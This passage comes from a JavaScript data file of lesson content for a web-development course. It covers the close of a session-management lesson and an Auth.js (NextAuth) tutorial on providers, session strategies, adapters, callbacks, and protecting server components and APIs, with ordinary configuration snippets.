              "❌ Keeping sessions only in server memory for production deployments.",
              "❌ Not invalidating sessions after password changes.",
              "❌ Missing CSRF protections when using cookie-based authentication.",
              "❌ Trusting only client-side checks to determine whether a user is authenticated."
            ]
          }
        ]
      },
      {
        heading: "DevSphere Special Note 💡",
        blocks: [
          {
            type: "note",
            content: "Many beginners believe that logging in is the hardest part of authentication. In reality, keeping users securely logged in is often the bigger engineering challenge.\n\nWhen designing session management, optimize for both security and user experience:\n\n* Sessions should be long enough that users aren't constantly forced to log in.\n* Sessions should be short enough to reduce the impact of stolen credentials.\n* Sensitive actions (changing passwords, deleting accounts, viewing financial data) should require additional verification, even if a valid session exists.\n\nTreat session identifiers with the same care as passwords—they grant access to the user's account.\n\nA well-designed session system is invisible to users but constantly protects them behind the scenes."
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "Session management is the mechanism that allows authenticated users to remain logged in across multiple requests despite HTTP being stateless."
          },
          {
            type: "paragraph",
            content: "In this lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "What sessions are and why they exist.",
              "The complete login session lifecycle.",
              "How session IDs and cookies work together.",
              "Server-side vs stateless session approaches.",
              "Cookie security attributes (HttpOnly, Secure, SameSite).",
              "Session expiration, refresh, rotation, fixation prevention, and invalidation.",
              "How session hijacking works and how to defend against it.",
              "Redis, database, and memory-backed session storage.",
              "Session management in modern Next.js applications.",
              "Production best practices and common implementation mistakes."
            ]
          },
          {
            type: "paragraph",
            content: "In the next lesson, NextAuth (Auth.js), you'll see how many of these session management concepts are implemented through a production-ready authentication library for Next.js, including providers, sessions, callbacks, adapters, and secure authentication flows."
          }
        ]
      }
    ]
  },




  /* ===========================
    Third Topic : NextAuth
============================= */
    "nextjs-nextauth": {
    title: "NextAuth",
    readingTime: "30 min",
        
    content: [
        {
        heading: "NextAuth (Auth.js) – Part 1",
        blocks: [
          {
            type: "paragraph",
            content: "The Official Authentication Library for Next.js"
          },
          {
            type: "paragraph",
            content: "Goal: Learn how Auth.js (formerly NextAuth.js) works internally, why it exists, how to configure it, and how it manages authentication in modern Next.js applications."
          }
        ]
      },
      {
        heading: "Introduction to NextAuth (Auth.js)",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication is one of the most difficult parts of building web applications."
          },
          {
            type: "paragraph",
            content: "A production-ready authentication system must handle:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User login",
              "User logout",
              "Password hashing",
              "OAuth login",
              "Session management",
              "Cookies",
              "JWTs",
              "CSRF protection",
              "Account linking",
              "Database persistence",
              "Email verification",
              "Password reset",
              "Middleware protection",
              "Refresh sessions",
              "Security attacks"
            ]
          },
          {
            type: "paragraph",
            content: "Building all of this from scratch is time-consuming and error-prone."
          },
          {
            type: "paragraph",
            content: "This is exactly why NextAuth.js was created."
          },
          {
            type: "paragraph",
            content: "Today, the project has evolved into Auth.js, a modern authentication solution that supports Next.js and other JavaScript frameworks while continuing to provide first-class support for Next.js."
          }
        ]
      },
      {
        heading: "What is Auth.js?",
        blocks: [
          {
            type: "paragraph",
            content: "Auth.js is an authentication framework that provides everything needed to authenticate users in a Next.js application."
          },
          {
            type: "paragraph",
            content: "It handles authentication logic so developers can focus on building application features instead of security infrastructure."
          },
          {
            type: "paragraph",
            content: "Instead of writing thousands of lines of authentication code, you configure Auth.js and let it manage:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Login",
              "Logout",
              "Sessions",
              "OAuth",
              "Cookies",
              "JWTs",
              "Database persistence",
              "Security protections"
            ]
          },
          {
            type: "paragraph",
            content: "Think of Auth.js as an authentication engine."
          },
          {
            type: "flow",
            steps: [
              "Your App", "→",
              "Auth.js", "→",
              "Authentication Logic", "→",
              "Database", "→",
              "OAuth Providers", "→",
              "Users"
            ]
          }
        ]
      },
      {
        heading: "NextAuth.js → Auth.js",
        blocks: [
          {
            type: "paragraph",
            content: "Originally the library was called:"
          },
          {
            type: "output",
            content: [
              "NextAuth.js"
            ]
          },
          {
            type: "paragraph",
            content: "As support expanded beyond Next.js, it became:"
          },
          {
            type: "output",
            content: [
              "Auth.js"
            ]
          },
          {
            type: "paragraph",
            content: "For Next.js applications you'll still commonly install the package:"
          },
          {
            type: "output",
            content: [
              "next-auth"
            ]
          },
          {
            type: "paragraph",
            content: "while using the modern Auth.js architecture and APIs."
          },
          {
            type: "paragraph",
            content: "Throughout the community you'll see both names used interchangeably."
          }
        ]
      },
      {
        heading: "Why NextAuth Exists",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine building authentication manually."
          },
          {
            type: "paragraph",
            content: "You would need to implement:"
          },
          {
            type: "flow",
            steps: [
              "Register", "→",
              "Hash Password", "→",
              "Login", "→",
              "Verify Password", "→",
              "Create Session", "→",
              "Store Cookie", "→",
              "Protect Routes", "→",
              "Logout", "→",
              "Refresh Session", "→",
              "OAuth", "→",
              "Password Reset", "→",
              "Email Verification"
            ]
          },
          {
            type: "paragraph",
            content: "Every one of these features introduces security risks."
          },
          {
            type: "paragraph",
            content: "Examples include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "SQL Injection",
              "Session hijacking",
              "CSRF attacks",
              "Weak password storage",
              "OAuth vulnerabilities",
              "Cookie misconfiguration"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of reinventing authentication every project,"
          },
          {
            type: "paragraph",
            content: "Auth.js provides battle-tested implementations."
          }
        ]
      },
      {
        heading: "Problems Without Auth.js",
        blocks: [
          {
            type: "paragraph",
            content: "Without an authentication library developers often write:"
          },
          {
            type: "flow",
            steps: [
              "Login API", "→",
              "Cookie Logic", "→",
              "JWT Logic", "→",
              "Session Logic", "→",
              "OAuth Logic", "→",
              "Middleware", "→",
              "Password Hashing", "→",
              "Database Queries"
            ]
          },
          {
            type: "paragraph",
            content: "Large applications quickly accumulate thousands of authentication-related lines of code."
          },
          {
            type: "paragraph",
            content: "Auth.js reduces most of this to configuration."
          }
        ]
      },
      {
        heading: "What Auth.js Solves",
        blocks: [
          {
            type: "paragraph",
            content: "Auth.js provides:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Session management",
              "JWT authentication",
              "Database sessions",
              "OAuth authentication",
              "Credentials authentication",
              "Email authentication",
              "Middleware support",
              "Secure cookies",
              "CSRF protection",
              "Callbacks",
              "Events",
              "Adapters",
              "Client hooks",
              "Server helpers"
            ]
          }
        ]
      },
      {
        heading: "Auth.js Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "Let's understand the complete architecture."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Login Page", "→",
              "Auth.js Route Handler", "→",
              "Authentication Provider", "→",
              "Database / OAuth Provider", "→",
              "Session Creation", "→",
              "Cookie / JWT", "→",
              "Authenticated User"
            ]
          },
          {
            type: "paragraph",
            content: "Every login request passes through Auth.js before reaching your application."
          }
        ]
      },
      {
        heading: "Internal Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "A simplified internal flow looks like this:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Sign In Request", "→",
              "Provider", "→",
              "Verify Identity", "→",
              "Callbacks", "→",
              "Session Strategy", "→",
              "Cookie/JWT", "→",
              "Middleware", "→",
              "Protected Routes", "→",
              "Application"
            ]
          },
          {
            type: "paragraph",
            content: "Each layer has a specific responsibility."
          }
        ]
      },
      {
        heading: "Core Components of Auth.js",
        blocks: [
          {
            type: "paragraph",
            content: "Auth.js consists of several building blocks."
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Providers",
              "Sessions",
              "JWT",
              "Database",
              "Callbacks",
              "Events",
              "Adapters",
              "Middleware",
              "Client API",
              "Server API"
            ]
          },
          {
            type: "paragraph",
            content: "Understanding each of these components is the key to mastering Auth.js."
          }
        ]
      },
      {
        heading: "Installation",
        blocks: [
          {
            type: "paragraph",
            content: "Install Auth.js:"
          },
          {
            type: "code",
            language: "bash",
            content: `npm install next-auth`
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "code",
            language: "bash",
            content: `pnpm add next-auth`
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "code",
            language: "bash",
            content: `yarn add next-auth`
          }
        ]
      },
      {
        heading: "Basic Project Structure",
        blocks: [
          {
            type: "paragraph",
            content: "A common App Router structure looks like this:"
          },
          {
            type: "tree",
            content: `app/
├── api/
│   └── auth/
│       └── [...nextauth]/
│           └── route.ts
├── dashboard/
├── login/
├── middleware.ts
├── auth.ts
└── lib/
    └── prisma.ts`
          },
          {
            type: "paragraph",
            content: "Many teams also place reusable authentication configuration in a dedicated auth.ts file at the project root or in src/."
          }
        ]
      },
      {
        heading: "Basic Configuration",
        blocks: [
          {
            type: "paragraph",
            content: "Modern Auth.js encourages centralizing configuration."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import NextAuth from "next-auth"

export const { handlers, auth, signIn, signOut } = NextAuth({
  providers: [],
})`
          },
          {
            type: "paragraph",
            content: "This creates reusable authentication utilities."
          }
        ]
      },
      {
        heading: "Route Handlers",
        blocks: [
          {
            type: "paragraph",
            content: "In the App Router, authentication endpoints are exposed through Route Handlers."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "tree",
            content: `app/
└── api/
    └── auth/
        └── [...nextauth]/
            └── route.ts`
          },
          {
            type: "paragraph",
            content: "Inside:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import { handlers } from "@/auth"

export const { GET, POST } = handlers`
          },
          {
            type: "paragraph",
            content: "Auth.js automatically handles requests such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "/api/auth/signin",
              "/api/auth/signout",
              "/api/auth/session",
              "/api/auth/callback/*"
            ]
          },
          {
            type: "paragraph",
            content: "You rarely implement these endpoints yourself."
          }
        ]
      },
      {
        heading: "Why Route Handlers?",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of manually writing:"
          },
          {
            type: "flow",
            steps: [
              "POST Login", "→",
              "Verify Password", "→",
              "Create Cookie", "→",
              "Return Session"
            ]
          },
          {
            type: "paragraph",
            content: "Auth.js automatically performs these operations through its Route Handler."
          }
        ]
      },
      {
        heading: "Providers",
        blocks: [
          {
            type: "paragraph",
            content: "A Provider defines how users authenticate."
          },
          {
            type: "paragraph",
            content: "Think of it as an identity source."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Google",
              "GitHub",
              "Credentials",
              "Microsoft",
              "Facebook",
              "Apple",
              "Discord",
              "LinkedIn",
              "GitLab",
              "Twitter (X)",
              "Email",
              "Azure AD",
              "Auth0"
            ]
          },
          {
            type: "paragraph",
            content: "Auth.js supports dozens of providers out of the box."
          }
        ]
      },
      {
        heading: "Provider Architecture",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Provider", "→",
              "Verify Identity", "→",
              "User Profile", "→",
              "Session Created"
            ]
          },
          {
            type: "paragraph",
            content: "Changing providers usually requires configuration rather than rewriting authentication logic."
          }
        ]
      },
      {
        heading: "Credentials Provider",
        blocks: [
          {
            type: "paragraph",
            content: "The Credentials Provider enables traditional username/password authentication."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import Credentials from "next-auth/providers/credentials"

Credentials({
  credentials: {
    email: {},
    password: {},
  },
  async authorize(credentials) {

    // Verify user

    return user
  }
})`
          },
          {
            type: "paragraph",
            content: "Inside authorize() you typically:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Query the database",
              "Verify the password with bcrypt or Argon2",
              "Return the user object",
              "Return null if authentication fails"
            ]
          }
        ]
      },
      {
        heading: "Credentials Authentication Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Login Form", "→",
              "Email\nPassword", "→",
              "authorize()", "→",
              "Database Lookup", "→",
              "Password Verification", "→",
              "Session"
            ]
          },
          {
            type: "paragraph",
            content: "This is the most common authentication strategy for enterprise applications."
          }
        ]
      },
      {
        heading: "Google Provider",
        blocks: [
          {
            type: "paragraph",
            content: "OAuth providers eliminate passwords."
          },
          {
            type: "paragraph",
            content: "Configuration:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import Google from "next-auth/providers/google"

Google({
  clientId: process.env.GOOGLE_CLIENT_ID!,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
})`
          },
          {
            type: "paragraph",
            content: "Login flow:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Google Login", "→",
              "Google Consent Screen", "→",
              "Google Verification", "→",
              "User Profile", "→",
              "Session"
            ]
          },
          {
            type: "paragraph",
            content: "No password is stored by your application."
          }
        ]
      },
      {
        heading: "GitHub Provider",
        blocks: [
          {
            type: "paragraph",
            content: "GitHub authentication is nearly identical."
          },
          {
            type: "code",
            language: "javascript",
            content: `import GitHub from "next-auth/providers/github"

GitHub({
  clientId: "...",
  clientSecret: "...",
})`
          },
          {
            type: "paragraph",
            content: "Commonly used for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Developer tools",
              "SaaS products",
              "Internal dashboards",
              "Open-source platforms"
            ]
          }
        ]
      },
      {
        heading: "OAuth Providers",
        blocks: [
          {
            type: "paragraph",
            content: "OAuth is an authorization protocol that allows users to sign in using existing accounts."
          },
          {
            type: "paragraph",
            content: "Popular OAuth providers include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Google",
              "GitHub",
              "Microsoft",
              "Apple",
              "Discord",
              "Facebook",
              "LinkedIn",
              "GitLab",
              "Slack",
              "Amazon",
              "Spotify",
              "Twitch"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of creating another password, users reuse identities they already trust."
          }
        ]
      },
      {
        heading: "OAuth Authentication Lifecycle",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Google Login", "→",
              "Consent Screen", "→",
              "Authorization Code", "→",
              "Access Token", "→",
              "Profile Information", "→",
              "Session Created"
            ]
          },
          {
            type: "paragraph",
            content: "Your application never receives the user's password."
          }
        ]
      },
      {
        heading: "Sessions",
        blocks: [
          {
            type: "paragraph",
            content: "After successful authentication, Auth.js creates a session."
          },
          {
            type: "paragraph",
            content: "Two session strategies are available."
          },
          {
            type: "output",
            content: [
              "JWT",
              "or",
              "Database Session"
            ]
          },
          {
            type: "paragraph",
            content: "Only one is used for a given configuration."
          }
        ]
      },
      {
        heading: "JWT Strategy",
        blocks: [
          {
            type: "paragraph",
            content: "In JWT mode:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login", "→",
              "JWT Generated", "→",
              "Cookie", "→",
              "Future Requests", "→",
              "JWT Verified"
            ]
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "No session database required",
              "Horizontally scalable",
              "Fast verification",
              "Great for distributed systems"
            ]
          },
          {
            type: "paragraph",
            content: "Trade-offs:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Harder to revoke immediately",
              "Token size is larger than a session ID",
              "Careful expiration management is important"
            ]
          }
        ]
      },
      {
        heading: "Database Strategy",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of storing everything in a token:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Session Cookie", "→",
              "Database", "→",
              "User"
            ]
          },
          {
            type: "paragraph",
            content: "The cookie contains only a session identifier."
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Easy logout from all devices",
              "Centralized session control",
              "Immediate revocation",
              "Rich session metadata"
            ]
          },
          {
            type: "paragraph",
            content: "Trade-offs:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Database lookup on authenticated requests",
              "Requires a persistent session store"
            ]
          }
        ]
      },
      {
        heading: "JWT vs Database Sessions",
        blocks: [
          {
            type: "table",
            headers: ["JWT Strategy", "Database Strategy"],
            rows: [
              ["Stateless", "Stateful"],
              ["No session table", "Session table required"],
              ["Easier horizontal scaling", "Easier revocation"],
              ["Faster verification", "Central session management"],
              ["Token carries data", "Server stores data"]
            ]
          },
          {
            type: "paragraph",
            content: "Neither strategy is universally better; choose based on your application's requirements."
          }
        ]
      },
      {
        heading: "Adapters",
        blocks: [
          {
            type: "paragraph",
            content: "Auth.js separates authentication from database implementation through Adapters."
          },
          {
            type: "paragraph",
            content: "An adapter connects Auth.js with your database."
          },
          {
            type: "flow",
            steps: [
              "Auth.js", "→",
              "Adapter", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "This abstraction allows the same authentication logic to work with many databases."
          }
        ]
      },
      {
        heading: "Supported Adapters",
        blocks: [
          {
            type: "paragraph",
            content: "Popular adapters include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Prisma",
              "MongoDB",
              "PostgreSQL",
              "MySQL",
              "SQLite",
              "Supabase",
              "Drizzle",
              "FaunaDB",
              "DynamoDB",
              "Azure Cosmos DB"
            ]
          }
        ]
      },
      {
        heading: "Prisma Adapter",
        blocks: [
          {
            type: "paragraph",
            content: "Prisma is one of the most popular adapters."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import { PrismaAdapter } from "@auth/prisma-adapter"

adapter: PrismaAdapter(prisma)`
          },
          {
            type: "paragraph",
            content: "Auth.js automatically stores:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Users",
              "Accounts",
              "Sessions",
              "Verification Tokens"
            ]
          },
          {
            type: "paragraph",
            content: "in Prisma-managed tables."
          }
        ]
      },
      {
        heading: "Prisma Database Structure",
        blocks: [
          {
            type: "paragraph",
            content: "Typical tables:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User",
              "Account",
              "Session",
              "VerificationToken"
            ]
          },
          {
            type: "paragraph",
            content: "Each serves a specific role:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User: profile information.",
              "Account: linked OAuth accounts.",
              "Session: active database sessions.",
              "VerificationToken: email verification and passwordless login."
            ]
          }
        ]
      },
      {
        heading: "MongoDB Adapter",
        blocks: [
          {
            type: "paragraph",
            content: "For MongoDB:"
          },
          {
            type: "code",
            language: "javascript",
            content: `adapter: MongoDBAdapter(client)`
          },
          {
            type: "paragraph",
            content: "Instead of SQL tables, documents are stored in MongoDB collections."
          },
          {
            type: "paragraph",
            content: "This is a natural fit for applications already using MongoDB."
          }
        ]
      },
      {
        heading: "Callbacks",
        blocks: [
          {
            type: "paragraph",
            content: "Callbacks allow you to customize Auth.js behavior."
          },
          {
            type: "paragraph",
            content: "Common callbacks include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "signIn",
              "jwt",
              "session",
              "redirect"
            ]
          },
          {
            type: "paragraph",
            content: "They execute during different stages of the authentication lifecycle."
          }
        ]
      },
      {
        heading: "signIn Callback",
        blocks: [
          {
            type: "paragraph",
            content: "Runs whenever a user signs in."
          },
          {
            type: "paragraph",
            content: "Example use cases:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Block suspended users.",
              "Allow only company email domains.",
              "Enforce invitation-only access."
            ]
          },
          {
            type: "code",
            language: "javascript",
            content: `callbacks: {
  async signIn({ user }) {
    return true
  }
}`
          }
        ]
      },
      {
        heading: "jwt Callback",
        blocks: [
          {
            type: "paragraph",
            content: "Runs whenever the JWT is created or updated."
          },
          {
            type: "paragraph",
            content: "Useful for embedding custom claims:"
          },
          {
            type: "code",
            language: "javascript",
            content: `callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.role = user.role
    }
    return token
  }
}`
          }
        ]
      },
      {
        heading: "session Callback",
        blocks: [
          {
            type: "paragraph",
            content: "Controls what the client receives."
          },
          {
            type: "code",
            language: "javascript",
            content: `callbacks: {
  async session({ session, token }) {
    session.user.role = token.role
    return session
  }
}`
          },
          {
            type: "paragraph",
            content: "This is a common place to expose safe, non-sensitive user information."
          }
        ]
      },
      {
        heading: "redirect Callback",
        blocks: [
          {
            type: "paragraph",
            content: "Allows custom redirect behavior after sign-in or sign-out."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Redirect administrators to /admin.",
              "Redirect users back to the page they originally requested."
            ]
          }
        ]
      },
      {
        heading: "Events",
        blocks: [
          {
            type: "paragraph",
            content: "Unlike callbacks, events are observational—they don't modify the authentication flow."
          },
          {
            type: "paragraph",
            content: "Common events:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "signIn",
              "signOut",
              "createUser",
              "linkAccount",
              "session"
            ]
          },
          {
            type: "paragraph",
            content: "Typical uses:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Audit logging",
              "Analytics",
              "Sending welcome emails",
              "Security monitoring"
            ]
          }
        ]
      },
      {
        heading: "Middleware Integration",
        blocks: [
          {
            type: "paragraph",
            content: "Auth.js integrates naturally with Next.js Middleware."
          },
          {
            type: "paragraph",
            content: "Flow:"
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Middleware", "→",
              "Check Session", "→",
              "Authenticated?", "→",
              "Yes → Continue\n\nNo → Redirect Login"
            ]
          },
          {
            type: "paragraph",
            content: "This protects routes before page rendering begins."
          }
        ]
      },
      {
        heading: "Client Hooks",
        blocks: [
          {
            type: "paragraph",
            content: "Client Components can access session information using hooks."
          },
          {
            type: "code",
            language: "jsx",
            content: `"use client"

import { useSession } from "next-auth/react"

export default function Profile() {
  const { data: session } = useSession()

  return <p>{session?.user?.name}</p>
}`
          },
          {
            type: "paragraph",
            content: "useSession() provides:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Session data",
              "Loading state",
              "Authentication status"
            ]
          },
          {
            type: "paragraph",
            content: "It is ideal for interactive UI."
          }
        ]
      },
      {
        heading: "Server Helpers",
        blocks: [
          {
            type: "paragraph",
            content: "Server Components should read authentication on the server."
          },
          {
            type: "paragraph",
            content: "Modern Auth.js exposes helpers such as:"
          },
          {
            type: "code",
            language: "javascript",
            content: `const session = await auth()`
          },
          {
            type: "paragraph",
            content: "This avoids unnecessary client-side requests and keeps sensitive logic on the server."
          }
        ]
      },
      {
        heading: "Complete Authentication Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Click Sign In", "→",
              "Provider", "→",
              "Credentials / OAuth", "→",
              "Authentication", "→",
              "Callbacks", "→",
              "Session Strategy", "→",
              "Cookie/JWT", "→",
              "Middleware", "→",
              "Protected Page", "→",
              "Server Component", "→",
              "auth()", "→",
              "Authenticated User"
            ]
          }
        ]
      },
      {
        heading: "Real-World Example",
        blocks: [
          {
            type: "paragraph",
            content: "Consider an e-commerce platform:"
          },
          {
            type: "flow",
            steps: [
              "Customer", "→",
              "Google Login", "→",
              "Auth.js", "→",
              "Prisma Adapter", "→",
              "PostgreSQL", "→",
              "Session Cookie", "→",
              "Middleware", "→",
              "Dashboard", "→",
              "Checkout", "→",
              "Orders"
            ]
          },
          {
            type: "paragraph",
            content: "Only a few configuration files are required, while Auth.js handles the complex authentication logic behind the scenes."
          }
        ]
      },
      {
        heading: "Key Takeaways",
        blocks: [
          {
            type: "paragraph",
            content: "By the end of this lesson, you should understand:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Why Auth.js exists and the problems it solves.",
              "The difference between Auth.js and manually building authentication.",
              "The overall Auth.js architecture.",
              "How Route Handlers power authentication endpoints.",
              "How Providers enable credentials and OAuth logins.",
              "The differences between JWT and database session strategies.",
              "The role of adapters in connecting Auth.js to databases.",
              "How callbacks customize authentication behavior.",
              "How events support logging and analytics.",
              "How middleware protects routes.",
              "When to use client hooks versus server helpers."
            ]
          },
          {
            type: "paragraph",
            content: "In the next part, you'll build on this foundation by exploring advanced Auth.js topics such as authorization flows, custom pages, session customization, provider composition, production deployment strategies, security hardening, and large-scale authentication architecture."
          },
          {
            type: "divider",
          }
        ]
      },

      {
        heading: "NextAuth (Auth.js) — Part 2",
        blocks: [
          {
            type: "paragraph",
            content: "Building Production-Ready Authentication with Auth.js"
          },
          {
            type: "paragraph",
            content: "Goal: Learn how to customize Auth.js for real-world applications by creating custom login pages, protecting routes and APIs, customizing sessions and JWTs, implementing role-based access control, handling refresh tokens, securing authentication, and deploying Auth.js to production."
          }
        ]
      },
      {
        heading: "Introduction",
        blocks: [
          {
            type: "paragraph",
            content: "In Part 1, we learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Why Auth.js exists",
              "Authentication architecture",
              "Providers",
              "Sessions",
              "JWT strategy",
              "Database strategy",
              "Adapters",
              "Route Handlers",
              "Middleware",
              "Client Hooks",
              "Server Helpers"
            ]
          },
          {
            type: "paragraph",
            content: "Now it's time to move beyond basic authentication."
          },
          {
            type: "paragraph",
            content: "Real-world applications require much more than simply logging users in."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Netflix must prevent normal users from accessing admin tools.",
              "GitHub protects repositories based on permissions.",
              "Amazon protects payment APIs.",
              "Google refreshes expired tokens automatically.",
              "Enterprise applications often have five or more user roles."
            ]
          },
          {
            type: "paragraph",
            content: "These production concerns are exactly what we'll cover in this lesson."
          }
        ]
      },
      {
        heading: "Custom Login Pages",
        blocks: [
          {
            type: "paragraph",
            content: "By default, Auth.js provides built-in authentication pages."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "output",
            content: [
              "/api/auth/signin",
              "/api/auth/signout",
              "/api/auth/error"
            ]
          },
          {
            type: "paragraph",
            content: "While these pages work well, most production applications replace them with custom pages that match their branding and user experience."
          }
        ]
      },
      {
        heading: "Why Create Custom Login Pages?",
        blocks: [
          {
            type: "paragraph",
            content: "Default pages are useful for development, but custom pages allow you to:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Match your application's design.",
              "Add logos and branding.",
              "Include additional fields (organization code, invitation code, etc.).",
              "Display custom validation messages.",
              "Offer multiple authentication methods.",
              "Track analytics.",
              "Improve user experience."
            ]
          }
        ]
      },
      {
        heading: "Authentication Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "/login", "→",
              "Custom UI", "→",
              "Sign In Button", "→",
              "Auth.js", "→",
              "Provider", "→",
              "Authenticated"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of redirecting users to the default Auth.js interface, they interact entirely with your application's UI."
          }
        ]
      },
      {
        heading: "Configuring Custom Pages",
        blocks: [
          {
            type: "paragraph",
            content: "You can tell Auth.js to use your own pages."
          },
          {
            type: "code",
            language: "javascript",
            content: `export const authOptions = {
  pages: {
    signIn: "/login",
    error: "/auth/error",
    verifyRequest: "/verify-email",
    newUser: "/welcome"
  }
}`
          },
          {
            type: "paragraph",
            content: "Now Auth.js redirects users to your pages instead of the built-in ones."
          }
        ]
      },
      {
        heading: "Building a Login Page",
        blocks: [
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "jsx",
            content: `"use client"

import { signIn } from "next-auth/react"

export default function LoginPage() {
  return (
    <button onClick={() => signIn("google")}>
      Continue with Google
    </button>
  )
}`
          },
          {
            type: "paragraph",
            content: "You can add:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Email/password forms",
              "Google login",
              "GitHub login",
              "Magic links",
              "Social buttons"
            ]
          },
          {
            type: "paragraph",
            content: "inside one page."
          }
        ]
      },
      {
        heading: "Protecting Pages",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication isn't enough."
          },
          {
            type: "paragraph",
            content: "You also need to prevent unauthorized users from viewing protected content."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "/dashboard",
              "/settings",
              "/orders",
              "/admin"
            ]
          },
          {
            type: "paragraph",
            content: "Only authenticated users should access these pages."
          }
        ]
      },
      {
        heading: "Protecting Server Components",
        blocks: [
          {
            type: "paragraph",
            content: "The recommended approach in the App Router is to check authentication on the server."
          },
          {
            type: "code",
            language: "jsx",
            content: `import { auth } from "@/auth"
import { redirect } from "next/navigation"

export default async function Dashboard() {

  const session = await auth()

  if (!session) {
    redirect("/login")
  }

  return <h1>Dashboard</h1>
}`
          },
          {
            type: "paragraph",
            content: "Since the check happens before rendering, protected data never reaches unauthenticated users."
          }
        ]
      },
      {
        heading: "Why Server-Side Protection?",
        blocks: [
          {
            type: "paragraph",
            content: "Bad approach:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Render Dashboard", "→",
              "JavaScript Checks Login", "→",
              "Redirect"
            ]
          },
          {
            type: "paragraph",
            content: "Sensitive data may already have been sent."
          },
          {
            type: "paragraph",
            content: "Good approach:"
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Server Authentication", "→",
              "Allowed?"
            ]
          },
          {
            type: "output",
            content: [
              "Yes → Render",
              "No → Redirect"
            ]
          },
          {
            type: "paragraph",
            content: "This is more secure and better for SEO."
          }
        ]
      },
      {
        heading: "Protecting APIs",
        blocks: [
          {
            type: "paragraph",
            content: "Not every request comes from a page."
          },
          {
            type: "paragraph",
            content: "Many applications expose APIs."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "/api/orders",
              "/api/profile",
              "/api/admin",
              "/api/payments"
            ]
          },
          {
            type: "paragraph",
            content: "These endpoints should verify authentication independently."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "javascript",
            content: `import { auth } from "@/auth"

export async function GET() {

  const session = await auth()

  if (!session) {
    return Response.json(
      { error: "Unauthorized" },
      { status: 401 }
    )
  }

  return Response.json({ success: true })
}`
          },
          {
            type: "paragraph",
            content: "Never assume that because a page is protected, the API is protected too."
          }
        ]
      },
      {
        heading: "Session Callbacks",
        blocks: [
          {
            type: "paragraph",
            content: "A session callback customizes the session object returned to the client."
          },
          {
            type: "paragraph",
